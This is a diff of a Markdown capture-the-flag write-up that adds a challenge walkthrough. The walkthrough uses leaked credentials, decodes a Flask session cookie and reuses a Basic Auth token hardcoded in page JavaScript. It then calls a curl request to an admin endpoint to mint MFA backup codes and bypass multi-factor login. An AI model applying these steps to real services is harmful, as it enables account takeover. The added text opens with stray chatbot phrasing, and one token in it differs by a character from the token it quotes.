@@ -108,7 +108,7 @@ From the schema, we can infer:
 **Key Types**
 
 * **Credentials:** `{ username, password }`
-* **Detail:** `{ first_name, last_name, email, phone, bio, role, address, notes, credentials, flag, profile }` ← notice `flag` here 👀
+* **Detail:** `{ first_name, last_name, email, phone, bio, role, address, notes, credentials, flag, profile }` ← notice `flag` here 
 * **UserShort:** `{ id, username }`
 * **UserContact:** `{ username, phone }`
 * **Address:** `{ city, region, country }`
@@ -239,5 +239,122 @@ Output:
 ```
 
 Flag : CloudSEK{Flag_3_gr4phq1_!$_fun}
+
+Perfect! Here’s **Challenge 4** formatted in Markdown, keeping all the details, outputs, and reasoning exactly as you provided:
+
+
+## Challenge: Bypassing Authentication - Flag 4
+
+- **Category:** Web  
+- **Points:** 100  
+
+### Solution
+From the previous step, the last `curl` request output contained the following data:
+
+```json
+{
+  "data": {
+    "userDetail": {
+      "address": {"city":"Boston","country":"US","region":"MA"},
+      "bio":"Devops Engineer",
+      "credentials":{"password":"l3t%27s%20go%20guys$25","username":"r00tus3r"},
+      "email":"alice.wright@example.com",
+      "first_name":"Alice",
+      "flag":"CloudSEK{Flag_3_gr4phq1_!$_fun}",
+      "last_name":"Wright",
+      "notes":["privileged account","monitoring enabled"],
+      "phone":"+1-617-555-9999",
+      "profile":"http://15.206.47.5:5000/",
+      "role":"Platform Administrator"
+    }
+  }
+}
+````
+
+We can see:
+
+* **Profile URL:** `http://15.206.47.5:5000/`
+* **Credentials:** `{"username":"r00tus3r","password":"l3t%27s%20go%20guys$25"}`
+
+#### Step 1: Login to the website
+
+Logging in at `http://15.206.47.5:5000/` with these credentials prompted an **MFA screen**, asking for either an authentication code or backup code.
+
+![image-6](images/image-6.png)
+![image-7](images/image-7.png)
+
+#### Step 2: Inspect client-side JavaScript
+
+Exploring the client-side JS, I found a function for generating backup codes:
+
+```javascript
+async function w(e) {
+    const t = "YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu"
+      , n = undefined;
+    return (await fetch("/api/admin/backup/generate", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            Authorization: `Basic ${t}`
+        },
+        body: JSON.stringify({
+            user_id: user_id
+        })
+    })).json()
+}
+```
+
+* The **Basic Auth token** (`YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu`) is exposed.
+* The request body requires the **user\_id**.
+
+#### Step 3: Obtain the `user_id`
+
+There was an endpoint to get a **Flask session cookie** by posting username and password. From the cookie, the `user_id` can be decoded:
+
+
+![image-8](images/image-8.png)
+
+```
+Token: eyJsb2dnZWRfaW4iOmZhbHNlLCJ1c2VyX2lkIjoiZjJmOTY4NTUtOGMwNS00NTk5LWE5OGMtZjdmMmZkNzE4ZmEyIiwidXNlcm5hbWUiOiJyMDB0dXMzciJ9.aKrCvA.RM6lpl7np3M1aR28xNX5stWJoCU
+```
+
+Decoded JSON:
+
+```json
+{
+  "logged_in": false,
+  "user_id": "f2f96855-8c05-4599-a98c-f7f2fd718fa2",
+  "username": "r00tus3r"
+}
+```
+
+* **User ID:** `f2f96855-8c05-4599-a98c-f7f2fd718fa2`
+
+#### Step 4: Generate Backup Codes
+
+Using the exposed Basic Auth token and the `user_id`:
+
+```bash
+curl -X POST http://15.206.47.5:5000/api/admin/backup/generate \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Basic YXBpLWFkbWluOkFwaU9ubHlCYXNpZFRva2Vu" \
+  -d '{"user_id": "f2f96855-8c05-4599-a98c-f7f2fd718fa2"}'
+```
+
+Output:
+
+```json
+{"backup_codes":["RN69-FI51","QSOF-FGNG","RJ2B-BSZU","KO3G-HDTB","OP37-X1FV","EVPP-XBB7","Z9ZD-J004","92RE-6N96"]}
+```
+
+#### Step 5: Login with Backup Code
+
+Using one of the backup codes to bypass MFA, I logged in successfully. The dashboard displayed the flag:
+
+![image-9](images/image-9.png)
+
+Flag : CloudSEK{Flag_4_T0k3n_3xp0s3d_JS_MFA_Byp4ss}
+
+
 
 
